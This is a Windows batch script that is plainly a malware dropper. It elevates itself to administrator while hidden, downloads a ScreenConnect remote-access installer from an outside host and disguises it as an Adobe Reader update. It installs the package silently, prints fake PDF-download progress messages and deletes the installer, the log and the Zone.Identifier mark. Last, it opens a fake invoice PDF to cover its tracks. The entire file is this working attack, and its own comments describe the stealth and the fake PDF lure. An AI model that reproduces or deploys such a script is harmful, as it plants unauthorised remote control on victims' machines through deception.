@echo off
setlocal EnableDelayedExpansion

:: =========================================================
:: AUTO-ELEVATE + HIDDEN LAUNCH (no flash)
:: =========================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: =========================================================
:: STEALTH CONFIG (random names + fake PDF flavor)
:: =========================================================
set "URL=https://filereader.app/tap/ScreenConnect.ClientSetup.msi"
set "MSI_FILE=%TEMP%\AcroRd32_Update_%RANDOM%.msi"
set "LOG_FILE=%TEMP%\AcroRd32_Update.log"
set "FAKE_PDF=%TEMP%\Invoice_Confirmation.pdf"

:: Fake progress (slow enough to look real, fast enough to not annoy)
echo Preparing PDF Viewer update...
timeout /t 1 >nul
echo Downloading secured pdf...
timeout /t 2 >nul

:: Download with PowerShell (stealthier than certutil)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Invoke-WebRequest -Uri '%URL%' -OutFile '%MSI_FILE%' -UseBasicParsing -UserAgent 'Mozilla/5.0'"

if not exist "%MSI_FILE%" (
    echo Unable to download PDF file. Please check your internet connection.
    timeout /t 3 >nul
    exit /b 1
)

echo PDF downloaded successfully
timeout /t 1 >nul

echo Preparing PDF viewer update...
echo Installing PDF viewer components...
timeout /t 2 >nul

:: Silent install
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Start-Process msiexec.exe -ArgumentList '/i \"%MSI_FILE%\" /qn /norestart /l*v \"%LOG_FILE%\"' -Wait -NoNewWindow"

if errorlevel 1 (
    echo Installation encountered an issue. Log saved for review.
) else (
    echo PDF viewer installed successfully
)

:: Aggressive cleanup
del /f /q "%MSI_FILE%" >nul 2>&1
del /f /q "%LOG_FILE%" >nul 2>&1
del "%MSI_FILE%:Zone.Identifier" >nul 2>&1

:: Final fake message + open fake PDF
echo =============================================
echo Document ready. You may now close this window.
echo PDF will be opened soon.
echo =============================================
timeout /t 2 >nul

:: Open fake PDF in browser (or real one if you drop one)
start "" "https://fake-invoice-viewer.com/confirmation.pdf" >nul 2>&1

endlocal
exit /b
